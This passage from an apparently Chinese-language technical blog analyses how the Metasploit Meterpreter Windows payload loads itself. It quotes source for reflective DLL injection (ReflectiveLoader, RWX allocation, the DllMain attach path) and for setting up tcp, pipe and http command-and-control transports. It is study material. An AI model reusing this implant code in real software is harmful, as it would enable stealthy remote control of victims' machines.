from ReflectiveLoader() to the <span class="keyword">end</span> of the DLL</span><br><span class="line">          add ebx, <span class="comment">#&#123;"0x%.8x" % (opts[:length] - opts[:rdi_offset])&#125;</span></span><br><span class="line">    ^</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unless</span> opts[<span class="symbol">:stageless</span>] <span class="params">||</span> opts[<span class="symbol">:force_write_handle</span>] == <span class="literal">true</span></span><br><span class="line">      asm &lt;&lt; %Q^</span><br><span class="line">          mov [ebx], edi        ; config_ptr</span><br><span class="line">      ^</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    asm &lt;&lt; %Q^</span><br><span class="line">          push ebx              ; 将指针指向config_ptr</span><br><span class="line">          push <span class="number">4</span>                ; DLL_METASPLOIT_ATTACH参数</span><br><span class="line">          push eax              ; hInstance</span><br><span class="line">          call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)</span><br><span class="line">    ^</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>接下来我们进行分析的<code>ReflectiveLoader</code>函数源码在此<a href="https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter" target="_blank" rel="noopener">github地址</a>，我们可以将源码克隆到本地可以使用VS开打工程进行分析，图15<code>0x1D136B</code>地址处为<code>ReflectiveLoader</code>函数逻辑开始处，接下来我们将主要对源码实现进行分析</p>
+<img src="/Internals_meterpreter_payload/15.jpg" title="图15">
+<p>首先初始化了5个函数指针变量</p>
+<img src="/Internals_meterpreter_payload/16.jpg" title="图16">
+<p>和我们逆向分析的相同调用了一个函数进行GetPC操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> intrinsic( _ReturnAddress )</span></span><br><span class="line"><span class="comment">// This function can not be inlined by the compiler or we will not get the address we expect. Ideally </span></span><br><span class="line"><span class="comment">// this code will be compiled with the /O2 and /Ob1 switches. Bonus points if we could take advantage of </span></span><br><span class="line"><span class="comment">// RIP relative addressing in this instance but I dont believe we can do so with the compiler intrinsics </span></span><br><span class="line"><span class="comment">// available (and no inline asm available under x64).</span></span><br><span class="line">__declspec(noinline) <span class="function">ULONG_PTR <span class="title">caller</span><span class="params">( VOID )</span> </span>&#123; <span class="keyword">return</span> (ULONG_PTR)_ReturnAddress(); &#125;</span><br><span class="line"><span class="comment">// STEP 0: calculate our images current base address</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// we will start searching backwards from our callers return address.</span></span><br><span class="line">uiLibraryAddress = caller();</span><br></pre></td></tr></table></figure>
+<p>接下来的操作就是用GetPC获取的地址进行<code>uiLibraryAddress--</code>搜索GetPC之前的内存获取Dos头MZ标志，之后获取到NT头的Signature就结束循环</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// loop through memory backwards searching for our images base address</span></span><br><span class="line"><span class="comment">// we dont need SEH style search as we shouldnt generate any access violations with this</span></span><br><span class="line"><span class="keyword">while</span>( TRUE )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>( ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_magic == IMAGE_DOS_SIGNATURE )</span><br><span class="line">	&#123;</span><br><span class="line">		uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;</span><br><span class="line">		<span class="comment">// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),</span></span><br><span class="line">		<span class="comment">// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.</span></span><br><span class="line">		<span class="keyword">if</span>( uiHeaderValue &gt;= <span class="keyword">sizeof</span>(IMAGE_DOS_HEADER) &amp;&amp; uiHeaderValue &lt; <span class="number">1024</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			uiHeaderValue += uiLibraryAddress;</span><br><span class="line">			<span class="comment">// break if we have found a valid MZ/PE header</span></span><br><span class="line">			<span class="keyword">if</span>( ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;Signature == IMAGE_NT_SIGNATURE )</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	uiLibraryAddress--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到图17源码中的宏定义<code>WIN_ARM</code>可见Meterpreter支持了Windows全平台的shellcode，接下来的部分源码我就不再分析了，如图17所示接下来的shellcode主要就是要获取所需要的5个函数，套路无非就是先获取PEB然后再…….</p>
+<img src="/Internals_meterpreter_payload/17.jpg" title="图17">
+<p>如果获取了所需的全部函数地址则停止搜索</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">		<span class="comment">// we stop searching when we have found everything we need.</span></span><br><span class="line">		<span class="keyword">if</span>( pLoadLibraryA</span><br><span class="line">			&amp;&amp; pGetProcAddress</span><br><span class="line">			&amp;&amp; pVirtualAlloc</span><br><span class="line">#ifdef ENABLE_STOPPAGING</span><br><span class="line">			&amp;&amp; pVirtualLock</span><br><span class="line">#endif</span><br><span class="line">			&amp;&amp; pNtFlushInstructionCache</span><br><span class="line">#ifdef ENABLE_OUTPUTDEBUGSTRING</span><br><span class="line">			&amp;&amp; pOutputDebug</span><br><span class="line">#endif</span><br><span class="line">			)</span><br><span class="line">			<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>获取了所需的函数之后进行的操作就是反射式注入了，我们只介绍反射式注入大概实现流程</p>
+<p>步骤一：首先根据<code>IMAGE_NT_HEADERS-&gt;OptionalHeader.SizeOfImage</code>为参数分配一块内存，然后使用VirtualLock函数防止这块内存被交换到硬盘中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// STEP 2: load our image into a new permanent location in memory...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// get the VA of the NT Header for the PE to be loaded</span></span><br><span class="line">	uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  </span></span><br><span class="line">	<span class="comment">// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.</span></span><br><span class="line">	uiBaseAddress = (ULONG_PTR)pVirtualAlloc( <span class="literal">NULL</span>, ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> ENABLE_STOPPAGING</span></span><br><span class="line">	<span class="comment">// prevent our image from being swapped to the pagefile</span></span><br><span class="line">	pVirtualLock((LPVOID)uiBaseAddress, ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfImage);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<p>步骤二：将各个节区以内存对齐方式拷贝到新内存中</p>
+<p>步骤三：处理导入表</p>
+<p>步骤四：处理所有重定位</p>
+<p>完成反射式注入之后首先会使用<code>DLL_PROCESS_ATTACH</code>为参数调用DllMain，最后操作<code>return uiValueA</code>将会返回到<code>bootstrapper</code>执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// STEP 6: call our images entry point</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// uiValueA = the VA of our newly loaded DLL/EXE's entry point</span></span><br><span class="line">	uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.AddressOfEntryPoint );</span><br><span class="line"></span><br><span class="line">	OUTPUTDBG(<span class="string">"Flushing the instruction cache"</span>);</span><br><span class="line">	<span class="comment">// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.</span></span><br><span class="line">	pNtFlushInstructionCache( (HANDLE)<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// call our respective entry point, fudging our hInstance value</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</span></span><br><span class="line">	<span class="comment">// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)</span></span><br><span class="line">	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter );</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="comment">// if we are injecting an DLL via a stub we call DllMain with no parameter</span></span><br><span class="line">	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, <span class="literal">NULL</span> );</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.</span></span><br><span class="line">	<span class="keyword">return</span> uiValueA;</span><br></pre></td></tr></table></figure>
+<p>图18为ReflectiveLoader函数执行完后要返回栈顶的<code>bootstrapper</code>执行</p>
+<img src="/Internals_meterpreter_payload/18.jpg" title="图18">
+<p>图19处<code>bootstrapper</code>以<code>DLL_METASPLOIT_ATTACH</code>为参数调用了DllMain</p>
+<img src="/Internals_meterpreter_payload/19.jpg" title="图19">
+<p>我们查看DllMain源代码，以<code>DLL_METASPLOIT_ATTACH</code>为参数调用DllMain就会执行<code>MetasploitDllAttach</code>函数，接着<code>MetasploitDllAttach</code>函数调用了<code>Init</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MetasploitDllAttach</span><span class="params">( SOCKET socket )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Init( socket );</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bReturnValue = TRUE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span>( dwReason ) </span><br><span class="line">    &#123; </span><br><span class="line">		<span class="keyword">case</span> DLL_METASPLOIT_ATTACH:</span><br><span class="line">			bReturnValue = MetasploitDllAttach( (SOCKET)lpReserved );</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DLL_METASPLOIT_DETACH:</span><br><span class="line">			bReturnValue = MetasploitDllDetach( (DWORD)lpReserved );</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DLL_QUERY_HMODULE:</span><br><span class="line">			<span class="keyword">if</span>( lpReserved != <span class="literal">NULL</span> )</span><br><span class="line">				*(HMODULE *)lpReserved = hAppInstance;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">			hAppInstance = hinstDLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">		<span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> bReturnValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们查看<code>Init</code>函数实现源码，源码注释说了传给<code>init</code>函数的参数其实不是socket而是一个指向<code>metConfig</code>结构的指针所以将<code>fd</code>进行强转成<code>MetsrvConfig*</code>类型，该函数主要调用了<code>server_setup</code>函数进行服务器设置，<code>switch case</code>语句主要对应了<code>meterpreter</code>控制命令几种不同<code>exitfunc</code>方式</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">DWORD __declspec(dllexport) Init(SOCKET fd)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 在metsrv有效负载的情况下，传递给init的参数不是套接字, 它实际上是</span></span><br><span class="line">	<span class="comment">// 一个指向metConfig的指针，所以进行一次糟糕的转换，然后继续。</span></span><br><span class="line">	MetsrvConfig* metConfig = (MetsrvConfig*)fd;</span><br><span class="line">	dprintf(<span class="string">"[METSRV] Getting ready to init with config %p"</span>, metConfig);</span><br><span class="line">	DWORD result = server_setup(metConfig);</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[METSRV] Exiting with %08x"</span>, metConfig-&gt;session.exit_func);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// We also handle exit func directly in metsrv now because the value is added to the</span></span><br><span class="line">	<span class="comment">// configuration block and we manage to save bytes in the stager/header as well.</span></span><br><span class="line">	<span class="keyword">switch</span> (metConfig-&gt;session.exit_func)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> EXITFUNC_SEH:</span><br><span class="line">		SetUnhandledExceptionFilter(<span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> EXITFUNC_THREAD:</span><br><span class="line">		ExitThread(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> EXITFUNC_PROCESS:</span><br><span class="line">		ExitProcess(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此为<code>meterpreter</code>中几种的<code>exitfunc</code>方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br></pre></td></tr></table></figure>
+<p>我们查看<code>MetsrvSession</code>结构体的定义，此结构体的成员为<code>MetsrvSession</code>结构体和<code>MetsrvTransportCommon</code>结构体数组，<code>MetsrvSession</code>结构体我们可以看到源码注释中可以判断此结构体主要是管理<code>session</code>的各种信息，比如当前<code>session</code>的退出<code>func</code>标识符此标识符对应<code>Init</code>函数中的<code>switch case</code>语句，还有当前会话的<code>GUID</code>和<code>UUID</code>等，<code>MetsrvTransportCommon</code>结构体数组中的成员主要作用是管理传输<code>host:port/URI</code>，还有在传输过程中关于通讯连接的会话数和连接通讯时间等</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MetsrvSession</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">union</span></span><br><span class="line">	&#123;</span><br><span class="line">		UINT_PTR handle;</span><br><span class="line">		BYTE padding[<span class="number">8</span>];</span><br><span class="line">	&#125; comms_handle;                       <span class="comment">///! Socket/handle for communications (如果有的话).</span></span><br><span class="line">	DWORD exit_func;                      <span class="comment">///! 当会话结束时退出func标识符.</span></span><br><span class="line">	<span class="keyword">int</span> expiry;                           <span class="comment">///! 在终止会话之前等待的总秒数.</span></span><br><span class="line">	BYTE uuid[UUID_SIZE];                 <span class="comment">///! UUID</span></span><br><span class="line">	BYTE session_guid[<span class="keyword">sizeof</span>(GUID)];      <span class="comment">///! 当前 会话 GUID</span></span><br><span class="line">&#125; MetsrvSession;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MetsrvTransportCommon</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	CHARTYPE url[URL_SIZE];               <span class="comment">///! Transport url:  scheme://host:port/URI</span></span><br><span class="line">	<span class="keyword">int</span> comms_timeout;                    <span class="comment">///! 等待新包的会话数.</span></span><br><span class="line">	<span class="keyword">int</span> retry_total;                      <span class="comment">///! 重试通讯的总秒数.</span></span><br><span class="line">	<span class="keyword">int</span> retry_wait;                       <span class="comment">///! 重新连接之间等待的秒数.</span></span><br><span class="line">&#125; MetsrvTransportCommon;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MetsrvConfig</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	MetsrvSession session;</span><br><span class="line">	MetsrvTransportCommon transports[<span class="number">1</span>];  <span class="comment">///! 占位符，用于0个或多个传输</span></span><br><span class="line">	<span class="comment">// 扩展将在此之后出现</span></span><br><span class="line">	<span class="comment">// 在扩展之后，我们得到一个扩展初始化器列表</span></span><br><span class="line">	<span class="comment">// &lt;扩展名1&gt;\x00&lt;datasize&gt;&lt;data&gt;</span></span><br><span class="line">	<span class="comment">// &lt;扩展名2&gt;\x00&lt;datasize&gt;&lt;data&gt;</span></span><br><span class="line">	<span class="comment">// \x00</span></span><br><span class="line">&#125; MetsrvConfig;</span><br></pre></td></tr></table></figure>
+<p>在<code>MetsrvConfig</code>结构体末尾的注释告诉了我们两个扩展模块的布局，所以灵魂画师上线如图20所示这就是两个扩展模块的大概布局</p>
+<img src="/Internals_meterpreter_payload/20.jpg" title="图20">
+<p><code>server_setup</code>函数主要的函数逻辑大概为<code>create_transports-&gt;register_dispatch_routines-&gt;load_stageless_extensions-&gt;server_dispatch</code>这个流程，<code>create_transports</code>函数会判断<code>MetsrvTransportCommon</code>结构体数组中的<code>url</code>字段是否有效，如果有效然后调用<code>create_transport</code>函数根据<code>url</code>字段进行创建<code>transport</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> Transport* <span class="title">create_transport</span><span class="params">(Remote* remote, MetsrvTransportCommon* transportCommon, LPDWORD size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Transport* transport = <span class="literal">NULL</span>;</span><br><span class="line">	dprintf(<span class="string">"[TRNS] Transport claims to have URL: %S"</span>, transportCommon-&gt;url);</span><br><span class="line">	dprintf(<span class="string">"[TRNS] Transport claims to have comms: %d"</span>, transportCommon-&gt;comms_timeout);</span><br><span class="line">	dprintf(<span class="string">"[TRNS] Transport claims to have retry total: %d"</span>, transportCommon-&gt;retry_total);</span><br><span class="line">	dprintf(<span class="string">"[TRNS] Transport claims to have retry wait: %d"</span>, transportCommon-&gt;retry_wait);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (wcsncmp(transportCommon-&gt;url, <span class="string">L"tcp"</span>, <span class="number">3</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		transport = transport_create_tcp((MetsrvTransportTcp*)transportCommon, size);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (wcsncmp(transportCommon-&gt;url, <span class="string">L"pipe"</span>, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		transport = transport_create_named_pipe((MetsrvTransportNamedPipe*)transportCommon, size);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		transport = transport_create_http((MetsrvTransportHttp*)transportCommon, size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (transport == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// something went wrong</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// always insert at the tail. The first transport will be the one that kicked everything off</span></span><br><span class="line">	<span class="keyword">if</span> (remote-&gt;transport == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// point to itself, as this is the first transport.</span></span><br><span class="line">		transport-&gt;next_transport = transport-&gt;prev_transport = transport;</span><br><span class="line">		remote-&gt;transport = transport;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		transport-&gt;prev_transport = remote-&gt;transport-&gt;prev_transport;</span><br><span class="line">		transport-&gt;next_transport = remote-&gt;transport;</span><br><span class="line"></span><br><span class="line">		remote-&gt;transport-&gt;prev_transport-&gt;next_transport = transport;</span><br><span class="line">		remote-&gt;transport-&gt;prev_transport = transport;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> transport;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> BOOL <span class="title">create_transports</span><span class="params">(Remote* remote, MetsrvTransportCommon* transports, LPDWORD parsedSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD totalSize = <span class="number">0</span>;</span><br><span class="line">	MetsrvTransportCommon* current = transports;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// The first part of the transport is always the URL, if it's NULL, we are done.</span></span><br><span class="line">	<span class="keyword">while</span> (current-&gt;url[<span class="number">0</span>] != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD size;</span><br><span class="line">		<span class="keyword">if</span> (create_transport(remote, current, &amp;size) != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			dprintf(<span class="string">"[TRANS] transport created of size %u"</span>, size);</span><br><span class="line">			totalSize += size;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// go to the next transport based on the size of the existing one.</span></span><br><span class="line">			current = (MetsrvTransportCommon*)((LPBYTE)current + size);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// This is not good</span></span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// account for the last terminating NULL wchar</span></span><br><span class="line">	*parsedSize = totalSize + <span class="keyword">sizeof</span>(<span class="keyword">wchar_t</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>register_dispatch_routines</code>函数调用了<code>command_register_all</code>函数进行注册一个完整的<code>Dispatch table</code>，<code>customCommands</code>参数为<code>Command</code>结构体数组我们可以看到此结构体数组中的每一个元素都为一个派遣处理函数，<code>command</code>结构为一个双向链表，其中的<code>method</code>成员为命令标识符，<code>request</code>和<code>response</code>分别为请求处理程序和响应处理程序，<code>command_register</code>函数将动态注册自定义命令处理程序插入双向链表中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 